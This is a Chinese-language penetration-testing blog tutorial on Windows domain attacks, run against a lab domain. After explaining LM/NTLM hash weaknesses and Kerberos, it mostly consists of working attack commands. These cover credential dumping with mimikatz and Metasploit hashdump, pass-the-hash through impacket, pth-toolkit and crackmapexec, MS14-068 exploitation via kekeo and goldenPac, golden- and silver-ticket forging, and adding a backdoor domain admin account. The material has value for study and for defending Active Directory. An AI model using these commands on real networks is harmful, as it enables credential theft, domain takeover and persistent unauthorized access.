<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307143037621.png" class title="image-20220307143037621">

<p>LM Hash 的脆弱性：</p>
<p>1、密码长度限制为从95个ASCII可打印字符中最多选择14个，也就是密码的最长长度为14位</p>
<p>2、密码不区分大小写。在生成哈希值之前，所有密码都被转换为大写。因此 LM 哈希将 PassWord、password、PaSsWoRd、PASSword 和其他类似的组合视为 PASSWORD。这样的设计无疑极大的降低了爆破的难度，更容易进行Hash碰撞。</p>
<p>3、 14 个字符的密码被分成 7+7 个字符，并分别计算每一半的哈希值。也就是可以把一个密码分成两次爆破，又降低了爆破难度。</p>
<p>4、如果密码长度小于等于7，则哈希的后半部分将始终产生相同的常量值 (0xAAD3B435B51404EE)。这就让攻击者很容易识别密码的大概长度。</p>
<p>5、Hash值在不加盐的情况下发送到网络服务器，易受到中间人攻击，例如Hash重放。（加盐就是在你生成密码后，随机生成一个字符串加到你密码后面进行Hash，这样就算是相同的密码，Hash也是不同的，至于中间人攻击属于密码学范畴，这里不再赘述了）</p>
<p>这么多缺点为啥还要使用LM Hash这种加密算法？</p>
<p>许多传统的第三方SMB花费了相当长的时间来添加对 Microsoft 创建的用于替换 LM 哈希的更强大协议的支持，因为支持这些库的社区首先必须对较新的协议进行SAMBA花了 5 年时间来添加NTLMv2支持，而JCIFS花了 10 年。也就是LM Hash使用范围太广了，本着向后兼容的原因，还在使用LM Hash进行存储</p>
<p>NTML(NT Lan Manager)：网上有博主说NTML就是NT hash，其实这样说是不严谨的，在我查阅microsoft的官方文档后发现其实NTLM、NTLMv2 和 Kerberos 都使用 NT hash，也称为 Unicode 哈希。所以，应该叫使用NT hash这种方法，而NTML是一种安全协议。注意NTML和Kerberos（以后会发文详解Kerberos）是两种协议，NTML的认证过程更简单，自然也比Kerberos更易受到攻击。但也是plus版本的LM Hash。</p>
<p>简单说一下NTML的认证过程：</p>
<p>1、用户输入username、password、domainname（交互式才需要这个步骤），客户端会计算hash值保存在本地</p>
<p>2、客户端将username明文发给DC</p>
<p>3、DC生成一个16Byte的随机数（challenge）发送给客户端</p>
<p>4、户端通过运算生成一个响应值response&#x3D;f(hashes,challenge,other)&#x3D;&gt;other根据版本变化，例如时间戳来防止回访等</p>
<p>5、客户端将响应值发送给DC</p>
<p>6、DC经过同样的运算result &#x3D; f(hashes,challenge,other)，然后比较result和response，一直就验证通过，不一致则验证不通过</p>
<p>7、备注：目标不一定是DC，hash对应的账号所登录的（有缓存的）工作站也可以。</p>
<p>NTLM 协议使用两个散列密码值中的一个或两个，这两个值也都存储在服务器（或域控制器）上，并且由于没有加盐它们是密码等效的，这意味着如果你从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。（这就是为什么dumphash后可以不用进行hash碰撞就能就行身份验证）</p>
<p>NTML就很安全吗？</p>
<p>自 2010 年起，微软就不再推荐在应用程序中使用 NTLM，因为NTML不支持最新的加密方式比如（AES 或 SHA-256），它使用的是MD4加密。</p>
<p>NTML的脆弱性：</p>
<p>1、易受hash传递攻击，在许多情况下， msf可用于从一台机器获取凭据，该凭据可用于控制另一台机器。 Squirtle 工具包可用于利用网站跨站点脚本xss攻击通过 NTLM 对附近资产进行攻击。</p>
<p>2、每一个可能的 8 字符 NTLM 密码哈希排列都可以在 3 小时内被破解。也就是密码短的NTML加密密码很容易被暴力破解。</p>
<h2 id="PTH攻击的原理及条件"><a href="#PTH攻击的原理及条件" class="headerlink" title="PTH攻击的原理及条件"></a>PTH攻击的原理及条件</h2><p>原理：本机 Windows 应用程序要求用户提供明文密码，然后调用LsaLogonUser之类的API，将密码转换为一个或两个哈希值（LM 或 NT 哈希），然后在 NTLM 身份验证期间将其发送到远程服务器。对该机制的分析表明，成功完成网络身份认证不需要明文密码，只需要哈希。<strong>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</strong></p>
<p>利用条件：</p>
<ul>
<li>域&#x2F;工作组环境</li>
<li>可以获得hash，但是条件不允许对hash爆破</li>
<li>网中存在和当前机器相同的密码</li>
</ul>
<h2 id="PTH的各种攻击手法"><a href="#PTH的各种攻击手法" class="headerlink" title="PTH的各种攻击手法"></a>PTH的各种攻击手法</h2><h3 id="一、mimikatz"><a href="#一、mimikatz" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><p>mimikatz的pth功能需要本地管理员权限。</p>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307174851960.png" class title="image-20220307174851960">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175035435.png" class title="image-20220307175035435">

<p>可以看到这里LM 和 NTML都使用了，这里只研究NTML，复制NTML Hash的值</p>
<p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:WHOAMIANONY &#x2F;ntlm:ab89b1295e69d353dd7614c7a3a80cec</p>
<p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:WHOAMIANONY &#x2F;ntlm:ab89b1295e69d353dd7614c7a3a80cec “&#x2F;run:mstsc.exe &#x2F;restrictedadmin”也可以使用此命令顺便打开对方的3389，这里只使用第一种</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175628272.png" class title="image-20220307175628272">

<p>看域成员机已经自动打开了一个administrator权限的cmd，这时连接域控192.168.93.30就不需要密码了</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307181533555.png" class title="image-20220307181533555">

<p>mimikatz的pass the hash成功</p>
<h3 id="二、msf的pth"><a href="#二、msf的pth" class="headerlink" title="二、msf的pth"></a>二、msf的pth</h3><p>msf内置有dumphash的模块</p>
<p>run post&#x2F;windows&#x2F;gather&#x2F;hashdump</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201432638.png" class title="image-20220307201432638">

<p>使用抓到的Hash登陆</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201809777.png" class title="image-20220307201809777">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308171935823.png" class title="image-20220308171935823">

<p>这里有坑，一定要把LM Hash的值全部替换成0，试了非常久，虽然抓到了LM Hash但是直接用LM Hash:NTML Hash或者只用NTML Hash都会提示身份认证有误，要把LM Hash的值改为0就没问题，我看网上博主有直接用NTML Hash的也可以成功，这里具体的原因我也不太懂。</p>
<h3 id="三、impacket工具包"><a href="#三、impacket工具包" class="headerlink" title="三、impacket工具包"></a>三、impacket工具包</h3><p>smbclient.py插件，这里的32个0是LM Hash的值，随便写什么都可以，因为windows 2012过后默认关闭LM Hash</p>
<p>python3 smbclient.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec WHOAMIANONY&#x2F;<a href="mailto:&#65;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#57;&#x33;&#x2e;&#x33;&#48;">&#65;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#57;&#x33;&#x2e;&#x33;&#48;</a></p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308091716872.png" class title="image-20220308091716872">



<p>smbexec.py插件使用</p>
<p>python3 smbexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec <a href="mailto:&#65;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x39;&#51;&#x2e;&#x33;&#x30;">&#65;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x39;&#51;&#x2e;&#x33;&#x30;</a></p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308092612807.png" class title="image-20220308092612807">



<p>psexec.py插件使用</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093101883.png" class title="image-20220308093101883">



<p>wmiexec.py使用</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093949487.png" class title="image-20220308093949487">

<p>impacket包中还有其他脚本（eg：<em>rpcdump.py</em>）也可以用来对smb进行攻击，使用方法大同小异，这里就不演示了</p>
<h3 id="四、PTH工具包"><a href="#四、PTH工具包" class="headerlink" title="四、PTH工具包"></a>四、PTH工具包</h3><p>pth-smbclient -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30&#x2F;c$，针对smb服务</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308094634025.png" class title="image-20220308094634025">



<p>pth-rpcclient -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30，针对rpc服务执行rpc命令</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095055606.png" class title="image-20220308095055606">



<p>pth-winexe -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30 cmd.exe</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095431637.png" class title="image-20220308095431637">

<p>与impacket工具包差不多，这里也有其他模块可以利用抓到的hash进行攻击，这里就不再演示了。</p>
<h3 id="五、Crackmapexec"><a href="#五、Crackmapexec" class="headerlink" title="五、Crackmapexec"></a>五、Crackmapexec</h3><p>crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -x whoami</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095928239.png" class title="image-20220308095928239">



<h1 id="PTT：Pass-The-Ticket（Hash票据传递）"><a href="#PTT：Pass-The-Ticket（Hash票据传递）" class="headerlink" title="PTT：Pass The Ticket（Hash票据传递）"></a>PTT：Pass The Ticket（Hash票据传递）</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><p>经典三连</p>
<p>什么是黄金票据白银票据？他们有什么用？kerberos又是什么？</p>
<p>首先先了解一下kerberos协议的认证过程（网上关于kerberos的详细解析非常多，这里就简单理一下）：客户端向**认证服务器 (AS)<strong>认证自己，认证服务器将用户名转发到</strong>密钥分发中心 **(KDC)<strong>。KDC 发出一个</strong>票据授予票据 (TGT)<strong>，该票据带有时间戳，并使用</strong>票据授予服务 (TGS)**的密钥对其进行加密，并将加密的结果返回给用户的工作站。这很少发生，通常是在用户登录时；TGT 会在某个时候过期，尽管它可能会在用户登录时由用户的会话管理器透明地更新。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/artech/archive/2007/07/05/807492.html">https://www.cnblogs.com/artech/archive/2007/07/05/807492.html</a></p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112450743.png" class title="image-20220308112450743">



<p>什么是黄金票据？</p>
<p>Golden Tickets 是伪造的 Ticket-Granting Tickets (TGT)，也称为身份验证票。可以访问域控，需要有域控的权限，拿到金票后域控更改密码也可以进行登陆。</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112603791.png" class title="image-20220308112603791">



<p>什么是白银票据？</p>
<p>银票是伪造的 Ticket Granting Service 票，也称为服务票。不可以访问域控，只能针对特定的服务进行访问，但是获取更容易，不需要任何特权账户，更隐秘。</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112720029.png" class title="image-20220308112720029">

<h2 id="PTT攻击的原理及条件"><a href="#PTT攻击的原理及条件" class="headerlink" title="PTT攻击的原理及条件"></a>PTT攻击的原理及条件</h2><p>黄金票据：主要用于做拿到域控后的权限维持，因为拿下了域控，所以能够抓到域内所有用户的Hash，因此利用krbtgt的Hash值可以伪造TGT，让某一普通用户成为域管理员</p>
<p>条件：</p>
<ul>
<li>krbtgt用户的hash</li>
<li>域名称</li>
<li>域的SID值</li>
<li>要伪造的用户名</li>
</ul>
<p>白银票据：白银票据是有效的TGS票据因为它是由为运行 Kerberos 身份验证服务的每个服务器配置的服务主体名称的服务帐户加密&#x2F;签名的。也就是说白银票据是由服务帐户（从计算机的本地 SAM 或服务帐户凭证提取的计算机帐户凭证）加密&#x2F;签名的。而且TGS没有与之关联的TGT也就是不会与域控直接联系，因此可以冒充域控对服务进行访问。</p>
<p>条件：</p>
<ul>
<li>域名，域sid</li>
<li>目标服务器名，目标服务器的服务</li>
<li>服务账号的NTML HASH </li>
<li>需要伪造的用户名</li>
</ul>
<p>两者最大的不同就是，黄金票据由krbtgt 的NTML Hash加密，白银票据由服务账号的NTML Hash加密</p>
<h2 id="PTT的各种攻击手法"><a href="#PTT的各种攻击手法" class="headerlink" title="PTT的各种攻击手法"></a>PTT的各种攻击手法</h2><h3 id="一、MS14-068"><a href="#一、MS14-068" class="headerlink" title="一、MS14-068"></a>一、MS14-068</h3><p>现在是普通的域成员的管理员权限，这里要注意执行域命令的话要使用在域中存在的账户，而system权限的账户whoami可以发现不在域中，所以这里一定要使用administrator权限的账户</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143024538.png" class title="image-20220308143024538">



<p>查看当前计算机名和域</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143635556.png" class title="image-20220308143635556">



<p>msf的自带模块可以定位域控及域主机名</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308145841037.png" class title="image-20220308145841037">



<p>执行mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”&gt;log.txt，抓取Hash</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150050482.png" class title="image-20220308150050482">

<p>发现有个域用户的账号密码用户名为administrator</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150718073.png" class title="image-20220308150718073">





<p>现在是无法访问域控的c盘的（正确命令应该是dir \\DC.WHOAMIANONY.ORG\c$或者dir \\DC\c$，这里故意做没有凭据时的错误回显，演示用）</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151507846.png" class title="image-20220308151507846">



<p>查看已控制的域用户的SID</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151818577.png" class title="image-20220308151818577">



<p>使用ms14-068，ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址  （域控地址可以是ip）</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152102520.png" class title="image-20220308152102520">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152322309.png" class title="image-20220308152322309">



<p>mimikatz清空之前缓存的凭证，导入伪造的凭证</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152451407.png" class title="image-20220308152451407">



<p>已经有域管的权限</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308153659219.png" class title="image-20220308153659219">

<h3 id="二、kekeo"><a href="#二、kekeo" class="headerlink" title="二、kekeo"></a>二、kekeo</h3><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718">https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p>
<p>exploit::ms14068 &#x2F;domain:whoamianony.org &#x2F;user:administrator &#x2F;password:Whoami2021 &#x2F;ptt</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155430200.png" class title="image-20220308155430200">

<p>这里我不知道为什么kali执行 dir \\DC\c$会报错，但是在win7本机确实可以访问，具体原因我不太明白</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155551146.png" class title="image-20220308155551146">

<h3 id="三、goldenpac"><a href="#三、goldenpac" class="headerlink" title="三、goldenpac"></a>三、goldenpac</h3><p>可以使用impacket包中的goldenpac脚本，直接获得一个system的cmd</p>
<p>需要在kali安装kerberos认证功能</p>
<p>apt-get install krb5-user</p>
<p>但是我使用此模块并没有成功弹回system的cmd。。。。。。</p>
<p>python3 goldenPac.py -dc-ip 192.168.93.30 -target-ip 192.168.93.20 whoamianony.org&#x2F;administrator:<a href="mailto:&#87;&#104;&#111;&#x61;&#x6d;&#105;&#50;&#x30;&#50;&#x31;&#64;&#68;&#x43;&#x2e;&#x77;&#104;&#x6f;&#97;&#x6d;&#x69;&#x61;&#x6e;&#x6f;&#110;&#x79;&#x2e;&#x6f;&#114;&#x67;">&#87;&#104;&#111;&#x61;&#x6d;&#105;&#50;&#x30;&#50;&#x31;&#64;&#68;&#x43;&#x2e;&#x77;&#104;&#x6f;&#97;&#x6d;&#x69;&#x61;&#x6e;&#x6f;&#110;&#x79;&#x2e;&#x6f;&#114;&#x67;</a></p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308162840622.png" class title="image-20220308162840622">

<h3 id="四、使用msf的模块"><a href="#四、使用msf的模块" class="headerlink" title="四、使用msf的模块"></a>四、使用msf的模块</h3><p>use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163401831.png" class title="image-20220308163401831">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163727221.png" class title="image-20220308163727221">

<p>在&#x2F;root&#x2F;.msf4&#x2F;loot文件夹下会生成一个文件，需要用mimikatz进行格式转换（生成的文件与mimikatz在同一目录下）</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165539270.png" class title="image-20220308165539270">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165504698.png" class title="image-20220308165504698">



<p>将生成的<a href="mailto:&#48;&#x2d;&#x30;&#48;&#x30;&#48;&#48;&#x30;&#48;&#x30;&#45;&#x61;&#x64;&#109;&#x69;&#110;&#105;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#114;&#x40;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;&#45;&#87;&#x48;&#x4f;&#65;&#x4d;&#73;&#65;&#78;&#x4f;&#x4e;&#x59;&#46;&#x4f;&#x52;&#71;&#x2e;&#x6b;&#x69;&#114;&#98;&#x69;">&#48;&#x2d;&#x30;&#48;&#x30;&#48;&#48;&#x30;&#48;&#x30;&#45;&#x61;&#x64;&#109;&#x69;&#110;&#105;&#115;&#x74;&#114;&#x61;&#x74;&#x6f;&#114;&#x40;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;&#45;&#87;&#x48;&#x4f;&#65;&#x4d;&#73;&#65;&#78;&#x4f;&#x4e;&#x59;&#46;&#x4f;&#x52;&#71;&#x2e;&#x6b;&#x69;&#114;&#98;&#x69;</a>拷贝回kali，通过kiwi模块导入</p>
<p>这个地方导入的时候又出现了错误。。我查阅很多资料发现其他博主也会导入不成功，目前我还是没弄懂原因</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308170058648.png" class title="image-20220308170058648">

<p>如果导入成功可以使用  exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset模块进行攻击</p>
<h3 id="五、制作黄金票据"><a href="#五、制作黄金票据" class="headerlink" title="五、制作黄金票据"></a>五、制作黄金票据</h3><p><strong>mimikatz制作</strong></p>
<p>使用mimikatz来抓取DC的Krbtgt用户的密码Hash，已经拿下域控的条件下，做权限维持用</p>
<p>在DC下使用mimikatz抓到了Krbtgt用户的密码Hash，此时DC被修改密码，我们控制的还有一台普通域用户的shell</p>
<p>在域控下抓到的Hash</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172118232.png" class title="image-20220308172118232">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172141266.png" class title="image-20220308172141266">

<p>满足前三点制作黄金票据的条件：1、域的SID S-1-5-21-1315137663-3706837544-1429009142 </p>
<p>2、域的名称 WHOAMIANONY</p>
<p>3、krbtgt的hash 6be58bfcc0a164af2408d1d3bd313c2a</p>
<p>4、伪造任意用户名</p>
<p>制作黄金票据</p>
<p>kerberos::golden &#x2F;user:administrator &#x2F;domain:whoamianony.org &#x2F;sid:S-1-5-21-1315137663-3706837544-1429009142 &#x2F;krbtgt:6be58bfcc0a164af2408d1d3bd313c2a &#x2F;ticket:hack.kirbi</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308173957253.png" class title="image-20220308173957253">



<p>清除之前的票据</p>
<p>kerberos::purge</p>
<p>kerberos::tgt</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174152540.png" class title="image-20220308174152540">



<p>导入生成的黄金票据</p>
<p>kerberos::ptt hack.kirbi</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174406051.png" class title="image-20220308174406051">



<p>可以正常访问域控，添加域管理员也可以</p>
<p>net user hack hack111!@ &#x2F;add &#x2F;domain</p>
<p>net group “domain admins” hack &#x2F;add &#x2F;domain</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174434161.png" class title="image-20220308174434161">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174617592.png" class title="image-20220308174617592">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174630585.png" class title="image-20220308174630585">



<p><strong>impacket工具包制作</strong></p>
<p>先删除之前的票据</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308180406045.png" class title="image-20220308180406045">



<p>制作黄金票据，票据可以在本机做好传给普通域成员机</p>
<p>python3 ticketer.py -nthash 6be58bfcc0a164af2408d1d3bd313c2a -domain-sid S-1-5-21-1315137663-3706837544-1429009142 -domain whoamianony.org administrator</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181640529.png" class title="image-20220308181640529">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181726991.png" class title="image-20220308181726991">



<p>更改域成员机环境配置</p>
<p>set KRB5CCNAME&#x3D;C:\administrator.ccache</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181807973.png" class title="image-20220308181807973">



<p>使用wmiexec来运行</p>
<p>wmiexec.exe whoamianony.org&#x2F;administrator@DC -k -no-pass，也可以直接访问域控</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308184724417.png" class title="image-20220308184724417">



<h3 id="六、制作白银票据伪造CIFS服务权限"><a href="#六、制作白银票据伪造CIFS服务权限" class="headerlink" title="六、制作白银票据伪造CIFS服务权限"></a>六、制作白银票据伪造CIFS服务权限</h3><p>CIFS：用于windows主机之间进行网络文件共享</p>
<p>同样需要域控的mimikatz获取一些信息</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308185345321.png" class title="image-20220308185345321">

<p>1、域名 WHOAMIANONY</p>
<p>2、域sid S-1-5-21-1315137663-3706837544-1429009142</p>
<p>3、服务账号的NTLM Hash ab89b1295e69d353dd7614c7a3a80cec</p>
<p>4、要伪造的用户名，随便填，常用administrator</p>
<p>5、域控ip 192.168.93.30</p>
<p>6、可利用的服务</p>
<p>制作银票再导入票据</p>
<p>kerberos::golden &#x2F;domain:whoamianony.org &#x2F;sid:S-1-5-21-1315137663-3706837544-1429009142 &#x2F;target:DC.whoamianony.org &#x2F;service:cifs &#x2F;rc4:ab89b1295e69d353dd7614c7a3a80cec &#x2F;user:administrator &#x2F;ptt</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190455630.png" class title="image-20220308190455630">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190515961.png" class title="image-20220308190515961">

<p>之后还可以使用psexec.exe 与域控建立交互式cmd，并且还是最高权限psexec.exe \DC.whoamianony.org cmd.exe</p>
<p>这是在域成员192.168.93.20上使用的psexec，kali可以打开远程桌面实现此功能</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191224922.png" class title="image-20220308191224922">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191324307.png" class title="image-20220308191324307">

<p>这个administrator是我们命名为这个的，制作票据的时候也可以命名为aaa，bbb等</p>
